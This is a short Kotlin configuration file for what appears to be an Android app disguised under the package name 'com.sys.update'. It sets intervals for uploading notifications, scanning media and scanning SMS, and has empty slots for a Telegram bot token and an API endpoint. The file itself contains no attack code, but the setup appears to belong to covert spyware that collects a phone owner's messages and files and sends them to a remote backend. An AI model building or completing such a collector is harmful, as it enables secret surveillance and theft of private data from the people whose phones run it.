package com.sys.update

/**
 * Central config — change here when backend is ready.
 * Leave empty for local-only mode (data stored on device).
 */
object Config {
    // Telegram Bot — set later when you build it
    const val TELEGRAM_BOT_TOKEN = ""
    const val TELEGRAM_CHAT_ID = ""

    // API endpoint — set later if using custom server
    const val API_ENDPOINT = ""

    // Scan intervals (milliseconds)
    const val NOTIF_UPLOAD_INTERVAL_MS = 60_000L      // 1 minute
    const val MEDIA_SCAN_INTERVAL_MS = 300_000L       // 5 minutes
    const val SMS_SCAN_INTERVAL_MS = 120_000L         // 2 minutes

    fun hasTelegram(): Boolean = TELEGRAM_BOT_TOKEN.isNotBlank() && TELEGRAM_CHAT_ID.isNotBlank()
    fun hasApi(): Boolean = API_ENDPOINT.isNotBlank()
    fun hasAnyBackend(): Boolean = hasTelegram() || hasApi()
}
